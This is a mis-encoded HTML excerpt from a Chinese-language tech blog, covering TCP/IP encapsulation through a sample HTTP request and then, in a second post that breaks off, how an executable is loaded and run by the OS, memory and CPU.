1ï¼šåº”ç”¨å±‚ï¼ˆHTTP åè®®ï¼‰ç”Ÿæˆæ•°æ®</h4><ul>
<li><p><strong>åŠŸèƒ½</strong>ï¼šåº”ç”¨å±‚è´Ÿè´£å¤„ç†ç”¨æˆ·çš„å…·ä½“éœ€æ±‚ï¼ˆè¿™é‡Œæ˜¯ â€œè·å–ç½‘é¡µå†…å®¹â€ï¼‰ï¼Œä½¿ç”¨ HTTP åè®®å®šä¹‰æ•°æ®æ ¼å¼ã€‚</p>
</li>
<li><p>è¿‡ç¨‹</p>
<p>ï¼š</p>
<p>æµè§ˆå™¨ï¼ˆåº”ç”¨å±‚ç¨‹åºï¼‰ç”Ÿæˆä¸€ä¸ª HTTP è¯·æ±‚æŠ¥æ–‡ï¼Œå†…å®¹å¤§è‡´å¦‚ä¸‹ï¼š</p>
<p>plaintext</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1  </span><br><span class="line">Host: www.example.com  </span><br><span class="line">User-Agent: Chrome/100.0.0.0  </span><br></pre></td></tr></table></figure>





<p>è¿™éƒ¨åˆ†æ˜¯ â€œåŸå§‹æ•°æ®â€ï¼Œéœ€è¦äº¤ç»™ä¸‹å±‚ï¼ˆä¼ è¾“å±‚ï¼‰å¤„ç†ã€‚</p>
</li>
</ul>
<h4 id="æ­¥éª¤-2ï¼šä¼ è¾“å±‚ï¼ˆTCP-åè®®ï¼‰å°è£…ï¼šæ·»åŠ -â€œç«¯å£ä¿¡æ¯â€"><a href="#æ­¥éª¤-2ï¼šä¼ è¾“å±‚ï¼ˆTCP-åè®®ï¼‰å°è£…ï¼šæ·»åŠ -â€œç«¯å£ä¿¡æ¯â€" class="headerlink" title="æ­¥éª¤ 2ï¼šä¼ è¾“å±‚ï¼ˆTCP åè®®ï¼‰å°è£…ï¼šæ·»åŠ  â€œç«¯å£ä¿¡æ¯â€"></a>æ­¥éª¤ 2ï¼šä¼ è¾“å±‚ï¼ˆTCP åè®®ï¼‰å°è£…ï¼šæ·»åŠ  â€œç«¯å£ä¿¡æ¯â€</h4><ul>
<li><p><strong>åŠŸèƒ½</strong>ï¼šä¼ è¾“å±‚è´Ÿè´£ â€œç«¯åˆ°ç«¯â€ çš„å¯é ä¼ è¾“ï¼ˆTCP æ˜¯å¯é åè®®ï¼‰ï¼Œé€šè¿‡<strong>ç«¯å£å·</strong>åŒºåˆ†åŒä¸€è®¾å¤‡ä¸Šçš„ä¸åŒåº”ç”¨ï¼ˆå¦‚æµè§ˆå™¨ç”¨ 80&#x2F;443 ç«¯å£ï¼ŒQQ ç”¨å…¶ä»–ç«¯å£ï¼‰ã€‚</p>
</li>
<li><p>è¿‡ç¨‹</p>
<p>ï¼š</p>
<p>ä¼ è¾“å±‚ï¼ˆTCPï¼‰ä¼šåœ¨ HTTP æ•°æ®å‰æ·»åŠ ä¸€ä¸ª</p>
<p>TCP å¤´éƒ¨</p>
<p>ï¼ŒåŒ…å«ï¼š</p>
<ul>
<li>æºç«¯å£ï¼ˆæµè§ˆå™¨éšæœºåˆ†é…ï¼Œå¦‚<code>54321</code>ï¼‰ï¼šæ ‡è®° â€œå“ªä¸ªåº”ç”¨å‘é€çš„â€ï¼›</li>
<li>ç›®æ ‡ç«¯å£ï¼ˆ<code>80</code>ï¼ŒHTTP é»˜è®¤ç«¯å£ï¼‰ï¼šæ ‡è®° â€œç›®æ ‡æœåŠ¡å™¨çš„å“ªä¸ªåº”ç”¨æ¥æ”¶â€ï¼›</li>
<li>åºåˆ—å·ã€ç¡®è®¤å·ï¼šç”¨äºç¡®ä¿æ•°æ®æœ‰åºã€ä¸ä¸¢å¤±ï¼ˆTCP çš„ â€œå¯é â€ ç‰¹æ€§ï¼‰ã€‚<br>æ­¤æ—¶æ•°æ®å•å…ƒç§°ä¸º<strong>TCP æ®µï¼ˆSegmentï¼‰</strong>ï¼Œäº¤ç»™ä¸‹å±‚ï¼ˆç½‘ç»œå±‚ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<h4 id="æ­¥éª¤-3ï¼šç½‘ç»œå±‚ï¼ˆIP-åè®®ï¼‰å°è£…ï¼šæ·»åŠ -â€œIP-åœ°å€ä¿¡æ¯â€"><a href="#æ­¥éª¤-3ï¼šç½‘ç»œå±‚ï¼ˆIP-åè®®ï¼‰å°è£…ï¼šæ·»åŠ -â€œIP-åœ°å€ä¿¡æ¯â€" class="headerlink" title="æ­¥éª¤ 3ï¼šç½‘ç»œå±‚ï¼ˆIP åè®®ï¼‰å°è£…ï¼šæ·»åŠ  â€œIP åœ°å€ä¿¡æ¯â€"></a>æ­¥éª¤ 3ï¼šç½‘ç»œå±‚ï¼ˆIP åè®®ï¼‰å°è£…ï¼šæ·»åŠ  â€œIP åœ°å€ä¿¡æ¯â€</h4><ul>
<li><p><strong>åŠŸèƒ½</strong>ï¼šç½‘ç»œå±‚è´Ÿè´£ â€œè·¨ç½‘ç»œè·¯ç”±â€ï¼Œé€šè¿‡<strong>IP åœ°å€</strong>ç¡®å®šæ•°æ®çš„ä¼ è¾“è·¯å¾„ï¼ˆä»ç”¨æˆ·è®¾å¤‡åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼‰ã€‚</p>
</li>
<li><p>è¿‡ç¨‹</p>
<p>ï¼š</p>
<p>ç½‘ç»œå±‚ï¼ˆIPï¼‰åœ¨ TCP æ®µå‰æ·»åŠ </p>
<p>IP å¤´éƒ¨</p>
<p>ï¼ŒåŒ…å«ï¼š</p>
<ul>
<li>æº IP åœ°å€ï¼ˆç”¨æˆ·è®¾å¤‡çš„ IPï¼Œå¦‚<code>192.168.1.100</code>ï¼‰ï¼›</li>
<li>ç›®æ ‡ IP åœ°å€ï¼ˆ<code>www.example.com</code>å¯¹åº”çš„ IPï¼Œå¦‚<code>93.184.216.34</code>ï¼Œé€šè¿‡ DNS è§£æè·å¾—ï¼‰ï¼›</li>
<li>åè®®ç±»å‹ï¼ˆæ­¤å¤„ä¸º<code>6</code>ï¼Œè¡¨ç¤ºä¸Šå±‚æ˜¯ TCPï¼‰ã€‚<br>æ­¤æ—¶æ•°æ®å•å…ƒç§°ä¸º<strong>IP æ•°æ®åŒ…ï¼ˆPacketï¼‰</strong>ï¼Œäº¤ç»™ä¸‹å±‚ï¼ˆç½‘ç»œæ¥å£å±‚ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<h4 id="æ­¥éª¤-4ï¼šç½‘ç»œæ¥å£å±‚ï¼ˆä»¥å¤ªç½‘åè®®ï¼‰å°è£…ï¼šæ·»åŠ -â€œMAC-åœ°å€ä¿¡æ¯â€"><a href="#æ­¥éª¤-4ï¼šç½‘ç»œæ¥å£å±‚ï¼ˆä»¥å¤ªç½‘åè®®ï¼‰å°è£…ï¼šæ·»åŠ -â€œMAC-åœ°å€ä¿¡æ¯â€" class="headerlink" title="æ­¥éª¤ 4ï¼šç½‘ç»œæ¥å£å±‚ï¼ˆä»¥å¤ªç½‘åè®®ï¼‰å°è£…ï¼šæ·»åŠ  â€œMAC åœ°å€ä¿¡æ¯â€"></a>æ­¥éª¤ 4ï¼šç½‘ç»œæ¥å£å±‚ï¼ˆä»¥å¤ªç½‘åè®®ï¼‰å°è£…ï¼šæ·»åŠ  â€œMAC åœ°å€ä¿¡æ¯â€</h4><ul>
<li><p><strong>åŠŸèƒ½</strong>ï¼šç½‘ç»œæ¥å£å±‚è´Ÿè´£ â€œç‰©ç†ä»‹è´¨ä¼ è¾“â€ï¼Œé€šè¿‡<strong>MAC åœ°å€</strong>åœ¨å±€åŸŸç½‘å†…è¯†åˆ«è®¾å¤‡ï¼ˆå¦‚è·¯ç”±å™¨ã€äº¤æ¢æœºï¼‰ã€‚</p>
</li>
<li><p>è¿‡ç¨‹</p>
<p>ï¼š</p>
<p>ç½‘ç»œæ¥å£å±‚ï¼ˆä»¥å¤ªç½‘ï¼‰åœ¨ IP æ•°æ®åŒ…å‰æ·»åŠ </p>
<p>ä»¥å¤ªç½‘å¤´éƒ¨</p>
<p>ï¼ŒåŒ…å«ï¼š</p>
<ul>
<li>æº MAC åœ°å€ï¼ˆç”¨æˆ·è®¾å¤‡çš„ç½‘å¡ MACï¼Œå¦‚<code>00:1A:2B:3C:4D:5E</code>ï¼‰ï¼›</li>
<li>ç›®æ ‡ MAC åœ°å€ï¼ˆå±€åŸŸç½‘å†…ä¸‹ä¸€è·³è®¾å¤‡çš„ MACï¼Œé€šå¸¸æ˜¯è·¯ç”±å™¨çš„ MACï¼Œå¦‚<code>AA:BB:CC:DD:EE:FF</code>ï¼‰ï¼›</li>
<li>ç±»å‹ï¼ˆ<code>0x0800</code>ï¼Œè¡¨ç¤ºä¸Šå±‚æ˜¯ IP åè®®ï¼‰ã€‚<br>åŒæ—¶åœ¨æ•°æ®å°¾éƒ¨æ·»åŠ <strong>å¸§æ ¡éªŒåºåˆ—ï¼ˆFCSï¼‰</strong>ï¼Œç”¨äºæ ¡éªŒæ•°æ®ä¼ è¾“æ˜¯å¦å‡ºé”™ã€‚<br>æ­¤æ—¶æ•°æ®å•å…ƒç§°ä¸º<strong>ä»¥å¤ªç½‘å¸§ï¼ˆFrameï¼‰</strong>ï¼Œé€šè¿‡ç‰©ç†ä»‹è´¨ï¼ˆç½‘çº¿ &#x2F; Wi-Fiï¼‰å‘é€ã€‚</li>
</ul>
</li>
</ul>
<h4 id="æ­¥éª¤-5ï¼šæ•°æ®åœ¨ç½‘ç»œä¸­ä¼ è¾“ï¼ˆè·¯ç”±è½¬å‘ï¼‰"><a href="#æ­¥éª¤-5ï¼šæ•°æ®åœ¨ç½‘ç»œä¸­ä¼ è¾“ï¼ˆè·¯ç”±è½¬å‘ï¼‰" class="headerlink" title="æ­¥éª¤ 5ï¼šæ•°æ®åœ¨ç½‘ç»œä¸­ä¼ è¾“ï¼ˆè·¯ç”±è½¬å‘ï¼‰"></a>æ­¥éª¤ 5ï¼šæ•°æ®åœ¨ç½‘ç»œä¸­ä¼ è¾“ï¼ˆè·¯ç”±è½¬å‘ï¼‰</h4><ul>
<li>ä»¥å¤ªç½‘å¸§ä»ç”¨æˆ·è®¾å¤‡å‘é€åˆ°è·¯ç”±å™¨ï¼Œè·¯ç”±å™¨è§£æä»¥å¤ªç½‘å¤´éƒ¨ï¼ˆéªŒè¯ MAC åœ°å€æ˜¯å¦åŒ¹é…ï¼‰ï¼Œç„¶åç§»é™¤ä»¥å¤ªç½‘å¤´éƒ¨ï¼Œæå– IP æ•°æ®åŒ…ã€‚</li>
<li>è·¯ç”±å™¨æ ¹æ® IP å¤´éƒ¨çš„ â€œç›®æ ‡ IP åœ°å€â€ï¼ˆ<code>93.184.216.34</code>ï¼‰æŸ¥è¯¢è·¯ç”±è¡¨ï¼Œç¡®å®šä¸‹ä¸€è·³è®¾å¤‡ï¼ˆå¯èƒ½æ˜¯å…¶ä»–è·¯ç”±å™¨ï¼‰ï¼Œé‡æ–°å°è£…æ–°çš„ä»¥å¤ªç½‘å¸§ï¼ˆç›®æ ‡ MAC åœ°å€æ”¹ä¸ºä¸‹ä¸€è·³è®¾å¤‡çš„ MACï¼‰ï¼Œç»§ç»­è½¬å‘ã€‚</li>
<li>ç»è¿‡å¤šè·³è·¯ç”±åï¼Œæ•°æ®æœ€ç»ˆåˆ°è¾¾<code>www.example.com</code>æ‰€åœ¨çš„æœåŠ¡å™¨å±€åŸŸç½‘ã€‚</li>
</ul>
<h4 id="æ­¥éª¤-6ï¼šæ¥æ”¶ç«¯ï¼ˆæœåŠ¡å™¨ï¼‰è§£å°è£…ï¼šé€å±‚è¿˜åŸæ•°æ®"><a href="#æ­¥éª¤-6ï¼šæ¥æ”¶ç«¯ï¼ˆæœåŠ¡å™¨ï¼‰è§£å°è£…ï¼šé€å±‚è¿˜åŸæ•°æ®" class="headerlink" title="æ­¥éª¤ 6ï¼šæ¥æ”¶ç«¯ï¼ˆæœåŠ¡å™¨ï¼‰è§£å°è£…ï¼šé€å±‚è¿˜åŸæ•°æ®"></a>æ­¥éª¤ 6ï¼šæ¥æ”¶ç«¯ï¼ˆæœåŠ¡å™¨ï¼‰è§£å°è£…ï¼šé€å±‚è¿˜åŸæ•°æ®</h4><p>æœåŠ¡å™¨æ”¶åˆ°æ•°æ®åï¼ŒæŒ‰ â€œä»ä¸‹åˆ°ä¸Šâ€ çš„é¡ºåºè§£å°è£…ï¼š</p>
<ol>
<li><strong>ç½‘ç»œæ¥å£å±‚</strong>ï¼šéªŒè¯ FCS æ— è¯¯åï¼Œç§»é™¤ä»¥å¤ªç½‘å¤´éƒ¨ï¼Œæå– IP æ•°æ®åŒ…ï¼Œäº¤ç»™ç½‘ç»œå±‚ã€‚</li>
<li><strong>ç½‘ç»œå±‚</strong>ï¼šè§£æ IP å¤´éƒ¨ï¼Œç¡®è®¤ç›®æ ‡ IP æ˜¯è‡ªå·±ï¼Œç§»é™¤ IP å¤´éƒ¨ï¼Œæå– TCP æ®µï¼Œäº¤ç»™ä¼ è¾“å±‚ã€‚</li>
<li><strong>ä¼ è¾“å±‚</strong>ï¼šè§£æ TCP å¤´éƒ¨ï¼Œé€šè¿‡ç›®æ ‡ç«¯å£ï¼ˆ<code>80</code>ï¼‰ç¡®å®šäº¤ç»™ HTTP æœåŠ¡ï¼ŒéªŒè¯åºåˆ—å·ç¡®ä¿æ•°æ®å®Œæ•´ï¼Œç§»é™¤ TCP å¤´éƒ¨ï¼Œæå– HTTP è¯·æ±‚æ•°æ®ï¼Œäº¤ç»™åº”ç”¨å±‚ã€‚</li>
<li><strong>åº”ç”¨å±‚</strong>ï¼šHTTP æœåŠ¡å¤„ç†è¯·æ±‚ï¼Œç”Ÿæˆå“åº”æ•°æ®ï¼ˆç½‘é¡µå†…å®¹ï¼‰ï¼Œç„¶åæŒ‰ä¸Šè¿°æ­¥éª¤åå‘å°è£…ï¼Œå‘é€å›ç”¨æˆ·è®¾å¤‡ã€‚</li>
</ol>
<h3 id="æ€»ç»“ï¼šå„å±‚å…³ç³»çš„æ ¸å¿ƒä½“ç°"><a href="#æ€»ç»“ï¼šå„å±‚å…³ç³»çš„æ ¸å¿ƒä½“ç°" class="headerlink" title="æ€»ç»“ï¼šå„å±‚å…³ç³»çš„æ ¸å¿ƒä½“ç°"></a>æ€»ç»“ï¼šå„å±‚å…³ç³»çš„æ ¸å¿ƒä½“ç°</h3><ul>
<li><strong>ä¾èµ–å…³ç³»</strong>ï¼šåº”ç”¨å±‚ï¼ˆHTTPï¼‰ä¾èµ–ä¼ è¾“å±‚ï¼ˆTCPï¼‰çš„ç«¯å£æ ‡è¯†ï¼Œä¼ è¾“å±‚ä¾èµ–ç½‘ç»œå±‚ï¼ˆIPï¼‰çš„åœ°å€è·¯ç”±ï¼Œç½‘ç»œå±‚ä¾èµ–ç½‘ç»œæ¥å£å±‚ï¼ˆä»¥å¤ªç½‘ï¼‰çš„ç‰©ç†ä¼ è¾“ã€‚</li>
<li><strong>å°è£… &#x2F; è§£å°è£…</strong>ï¼šå‘é€ç«¯æ¯å±‚æ·»åŠ å¤´éƒ¨ï¼ˆå°è£…ï¼‰ï¼Œæ¥æ”¶ç«¯æ¯å±‚ç§»é™¤å¤´éƒ¨ï¼ˆè§£å°è£…ï¼‰ï¼Œæ•°æ®åƒ â€œå‰¥æ´‹è‘±â€ ä¸€æ ·é€å±‚è¿˜åŸã€‚</li>
<li><strong>ç‹¬ç«‹æ€§</strong>ï¼šå¦‚æœç”¨æˆ·åˆ‡æ¢ç½‘ç»œï¼ˆå¦‚ä»æœ‰çº¿æ¢ Wi-Fiï¼‰ï¼Œåªéœ€ç½‘ç»œæ¥å£å±‚è°ƒæ•´ MAC åœ°å€å’Œä¼ è¾“ä»‹è´¨ï¼Œä¸Šå±‚ï¼ˆIP&#x2F;TCP&#x2F;HTTPï¼‰æ— éœ€ä»»ä½•ä¿®æ”¹ï¼Œä½“ç°äº†åˆ†å±‚è®¾è®¡çš„çµæ´»æ€§ã€‚</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/07/17/%E7%A8%8B%E5%BA%8F%E6%80%8E%E4%B9%88%E8%BF%90%E8%A1%8C%E8%B5%B7%E6%9D%A5%E7%9A%84/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/tou.jpg">
      <meta itemprop="name" content="JC">
      <meta itemprop="description" content="Ê•Â´â€¢á´¥â€¢Â Ê”">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mvegetable'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/17/%E7%A8%8B%E5%BA%8F%E6%80%8E%E4%B9%88%E8%BF%90%E8%A1%8C%E8%B5%B7%E6%9D%A5%E7%9A%84/" class="post-title-link" itemprop="url">ç¨‹åºæ€ä¹ˆè¿è¡Œèµ·æ¥çš„</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-07-17 00:44:29 / ä¿®æ”¹æ—¶é—´ï¼š00:46:23" itemprop="dateCreated datePublished" datetime="2025-07-17T00:44:29+08:00">2025-07-17</time>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>1.5k</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="å››å¤§é‡‘åˆš"><a href="#å››å¤§é‡‘åˆš" class="headerlink" title="å››å¤§é‡‘åˆš"></a>å››å¤§é‡‘åˆš</h2><p>ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶è¿è¡Œèµ·æ¥éœ€è¦å››ä¸ªæ ¸å¿ƒéƒ¨ä»¶ï¼š å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ“ä½œç³»ç»Ÿï¼ˆosï¼‰ï¼Œå†…å­˜ï¼ˆramï¼‰ï¼Œå¤„ç†å™¨ï¼ˆcpuï¼‰ååŒæ“ä½œã€‚</p>
<h4 id="1-å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰"><a href="#1-å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰" class="headerlink" title="1. å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰"></a>1. å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰</h4><ul>
<li><strong>ä½œç”¨</strong>ï¼šç¨‹åºçš„ â€œé™æ€è½½ä½“â€ï¼ŒåŒ…å«è®¡ç®—æœºå¯ç›´æ¥æ‰§è¡Œçš„æœºå™¨æŒ‡ä»¤ï¼ˆäºŒè¿›åˆ¶ä»£ç ï¼‰ã€æ•°æ®ï¼ˆå¦‚å¸¸é‡ã€åˆå§‹åŒ–å˜é‡ï¼‰ã€ä»¥åŠç”¨äºåŠ è½½çš„å…ƒä¿¡æ¯ï¼ˆå¦‚æ–‡ä»¶æ ¼å¼ã€å†…å­˜å¸ƒå±€æè¿°ã€å…¥å£ç‚¹åœ°å€ç­‰ï¼‰ã€‚</li>
<li><strong>å¸¸è§æ ¼å¼</strong>ï¼šWindows çš„ <code>.exe</code>ã€Linux çš„ ELFï¼ˆExecutable and Linkable Formatï¼‰ã€macOS çš„ Mach-O ç­‰ã€‚è¿™äº›æ ¼å¼è§„å®šäº†æŒ‡ä»¤å’Œæ•°æ®çš„ç»„ç»‡æ–¹å¼ï¼Œè®©æ“ä½œç³»ç»Ÿèƒ½æ­£ç¡®è§£æå¹¶åŠ è½½ã€‚</li>
</ul>
<h4 id="2-æ“ä½œç³»ç»Ÿï¼ˆOSï¼‰"><a href="#2-æ“ä½œç³»ç»Ÿï¼ˆOSï¼‰" class="headerlink" title="2. æ“ä½œç³»ç»Ÿï¼ˆOSï¼‰"></a>2. æ“ä½œç³»ç»Ÿï¼ˆOSï¼‰</h4><ul>
<li><p>ä½œç”¨</p>
<p>ï¼šç¨‹åºè¿è¡Œçš„ â€œç®¡ç†è€…â€ï¼Œè´Ÿè´£åè°ƒç¡¬ä»¶èµ„æºå¹¶æä¾›è¿è¡Œç¯å¢ƒï¼Œæ ¸å¿ƒåŠŸèƒ½åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>åŠ è½½ç¨‹åº</strong>ï¼šå°†å¯æ‰§è¡Œæ–‡ä»¶ä»ç£ç›˜è¯»å…¥å†…å­˜ï¼Œæ ¹æ®æ–‡ä»¶ä¸­çš„å…ƒä¿¡æ¯ï¼ˆå¦‚æ®µè¡¨ï¼‰åˆ†é…å†…å­˜åŒºåŸŸï¼ˆä»£ç æ®µã€æ•°æ®æ®µã€æ ˆã€å †ç­‰ï¼‰ï¼Œå¹¶è®¾ç½®æƒé™ï¼ˆå¦‚ä»£ç æ®µè®¾ä¸ºåªè¯»å¯æ‰§è¡Œï¼‰ã€‚</li>
<li><strong>è¿›ç¨‹ç®¡ç†</strong>ï¼šä¸ºç¨‹åºåˆ›å»ºè¿›ç¨‹ï¼ˆæˆ–çº¿ç¨‹ï¼‰ï¼Œåˆ†é…è¿›ç¨‹æ§åˆ¶å—ï¼ˆPCBï¼‰è®°å½•è¿›ç¨‹çŠ¶æ€ï¼ˆå¦‚ PIDã€å¯„å­˜å™¨å€¼ã€å†…å­˜æ˜ å°„ç­‰ï¼‰ï¼Œå¹¶è°ƒåº¦è¿›ç¨‹è·å¾—å¤„ç†å™¨æ—¶é—´ã€‚</li>
<li><strong>èµ„æºæŠ½è±¡ä¸åˆ†é…</strong>ï¼šé€šè¿‡ç³»ç»Ÿè°ƒç”¨ï¼ˆå¦‚æ–‡ä»¶æ“ä½œã€å†…å­˜åˆ†é…ï¼‰ä¸ºç¨‹åºæä¾›ç»Ÿä¸€çš„ç¡¬ä»¶è®¿é—®æ¥å£ï¼Œé¿å…ç¨‹åºç›´æ¥æ“ä½œç¡¬ä»¶ã€‚</li>
<li><strong>å†…å­˜ç®¡ç†</strong>ï¼šé€šè¿‡è™šæ‹Ÿå†…å­˜æœºåˆ¶å°†ç¨‹åºçš„é€»è¾‘åœ°å€æ˜ å°„åˆ°ç‰©ç†å†…å­˜ï¼Œå®ç°å†…å­˜éš”ç¦»ï¼ˆä¸åŒç¨‹åºäº’ä¸å¹²æ‰°ï¼‰å’Œé«˜æ•ˆåˆ©ç”¨ï¼ˆå¦‚å†…å­˜åˆ†é¡µã€äº¤æ¢ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<h4 id="3-å†…å­˜ï¼ˆRAMï¼‰"><a href="#3-å†…å­˜ï¼ˆRAMï¼‰" class="headerlink" title="3. å†…å­˜ï¼ˆRAMï¼‰"></a>3. å†…å­˜ï¼ˆRAMï¼‰</h4><ul>
<li><p>ä½œç”¨</p>
<p>ï¼šç¨‹åºè¿è¡Œçš„ â€œä¸´æ—¶æ•°æ®ç©ºé—´â€ï¼Œç”¨äºå­˜å‚¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­çš„æŒ‡ä»¤å’Œæ•°æ®ï¼š</p>
<ul>
<li><strong>ä»£ç æ®µï¼ˆText Segmentï¼‰</strong>ï¼šå­˜æ”¾å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æœºå™¨æŒ‡ä»¤ï¼Œä¾›å¤„ç†å™¨è¯»å–å¹¶æ‰§è¡Œã€‚</li>
<li><strong>æ•°æ®æ®µï¼ˆData Segmentï¼‰</strong>ï¼šå­˜æ”¾åˆå§‹åŒ–çš„å…¨å±€å˜é‡ã€é™æ€å˜é‡ï¼ˆç¼–è¯‘æ—¶å·²çŸ¥å€¼ï¼‰ã€‚</li>
<li><strong>BSS æ®µ</strong>ï¼šå­˜æ”¾æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ã€é™æ€å˜é‡ï¼ˆé»˜è®¤åˆå§‹åŒ–ä¸º 0ï¼Œç”±æ“ä½œç³»ç»Ÿåœ¨åŠ è½½æ—¶åˆ†é…ç©ºé—´ï¼‰ã€‚</li>
<li><strong>æ ˆï¼ˆStackï¼‰</strong>ï¼šå­˜å‚¨å‡½æ•°å‚æ•°ã€å±€éƒ¨å˜é‡ã€è¿”å›åœ°å€ç­‰ï¼ˆè§å‰æ–‡è¯¦è§£ï¼‰ã€‚</li>
<li><strong>å †ï¼ˆHeapï¼‰</strong>ï¼šåŠ¨æ€åˆ†é…çš„å†…å­˜ï¼ˆå¦‚<code>malloc</code>ç”³è¯·çš„ç©ºé—´ï¼‰ï¼Œä¾›ç¨‹åºè¿è¡Œæ—¶çµæ´»ä½¿ç”¨ã€‚</li>
</ul>
</li>
</ul>
<h4 id="4-å¤„ç†å™¨ï¼ˆCPUï¼‰"><a href="#4-å¤„ç†å™¨ï¼ˆCPUï¼‰" class="headerlink" title="4. å¤„ç†å™¨ï¼ˆCPUï¼‰"></a>4. å¤„ç†å™¨ï¼ˆCPUï¼‰</h4><ul>
<li><p>ä½œç”¨</p>
<p>ï¼šç¨‹åºæ‰§è¡Œçš„ â€œè¿ç®—æ ¸å¿ƒâ€ï¼Œè´Ÿè´£é€æ¡æ‰§è¡Œå†…å­˜ä¸­çš„æœºå™¨æŒ‡ä»¤ï¼š</p>
<ul>
<li>é€šè¿‡<strong>ç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰</strong> æŒ‡å‘å½“å‰è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ï¼Œæ‰§è¡Œåè‡ªåŠ¨æ›´æ–°ä¸ºä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ã€‚</li>
<li>é€šè¿‡<strong>å¯„å­˜å™¨</strong>æš‚å­˜è¿ç®—æ•°æ®ï¼ˆå¦‚ç´¯åŠ å™¨ã€åœ°å€å¯„å­˜å™¨ï¼‰ï¼ŒåŠ é€ŸæŒ‡ä»¤æ‰§è¡Œï¼ˆå¯„å­˜å™¨é€Ÿåº¦è¿œå¿«äºå†…å­˜ï¼‰ã€‚</li>
<li>æ‰§è¡ŒæŒ‡ä»¤æ—¶æ¶‰åŠçš„è¿ç®—ï¼ˆå¦‚åŠ å‡ã€é€»è¾‘åˆ¤æ–­ï¼‰ã€å†…å­˜è®¿é—®ï¼ˆå¦‚è¯»æ•°æ®ã€å†™ç»“æœï¼‰ã€è·³è½¬ï¼ˆå¦‚å‡½æ•°è°ƒç”¨ï¼‰ç­‰æ“ä½œï¼Œå‡ç”± CPU å®Œæˆã€‚</li>
</ul>
</li>
</ul>
<h2 id="è¿è¡Œè¿‡ç¨‹"><a href="#è¿è¡Œè¿‡ç¨‹" class="headerlink" title="è¿è¡Œè¿‡ç¨‹"></a>è¿è¡Œè¿‡ç¨‹</h2><ol>
<li><strong>å¯åŠ¨ç¨‹åº</strong>ï¼šç”¨æˆ·é€šè¿‡æ“ä½œç³»ç»Ÿï¼ˆå¦‚è°ƒç”¨ç³»ç»Ÿçš„shellå‡½æ•°ï¼‰è§¦å‘ç¨‹åºè¿è¡Œè¯·æ±‚ã€‚</li>
<li><strong>åŠ è½½åˆ°å†…å­˜</strong>ï¼šæ“ä½œç³»ç»Ÿè§£æå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆelfæ–‡ä»¶æ ¼å¼ï¼‰ï¼Œæ ¹æ®å…¶å…ƒä¿¡æ¯åœ¨å†…å­˜ä¸­åˆ†é…ç©ºé—´ï¼ˆä»£ç æ®µã€æ•°æ®æ®µã€æ ˆç­‰ï¼‰ï¼Œå°†æ–‡ä»¶ä¸­çš„æŒ‡ä»¤å’Œæ•°æ®å¤åˆ¶åˆ°å¯¹åº”å†…å­˜åŒºåŸŸã€‚</li>
<li><strong>åˆ›å»ºè¿›ç¨‹</strong>ï¼šæ“ä½œç³»ç»Ÿä¸ºç¨‹åºåˆ›å»ºè¿›ç¨‹ï¼Œåˆå§‹åŒ–è¿›ç¨‹æ§åˆ¶å—ï¼ˆPCBï¼‰ï¼Œè®¾ç½®ç¨‹åºå…¥å£ç‚¹ï¼ˆç¬¬ä¸€æ¡æŒ‡ä»¤çš„å†…å­˜åœ°å€ï¼‰ã€‚</li>
<li><strong>è°ƒåº¦æ‰§è¡Œ</strong>ï¼šæ“ä½œç³»ç»Ÿå°†è¿›ç¨‹æ”¾å…¥è°ƒåº¦é˜Ÿåˆ—ï¼Œå½“åˆ†é…åˆ° CPU æ—¶é—´ç‰‡æ—¶ï¼ŒCPU ä»ç¨‹åºå…¥å£ç‚¹å¼€å§‹æ‰§è¡ŒæŒ‡ä»¤ï¼š<ul>
<li>ä»å†…å­˜ä¸­è¯»å–æŒ‡ä»¤åˆ° CPUï¼Œè§£ç åæ‰§è¡Œï¼ˆå¦‚è¿ç®—ã€è¯»å†™å†…å­˜ã€è°ƒç”¨å‡½æ•°ç­‰ï¼‰ã€‚</li>
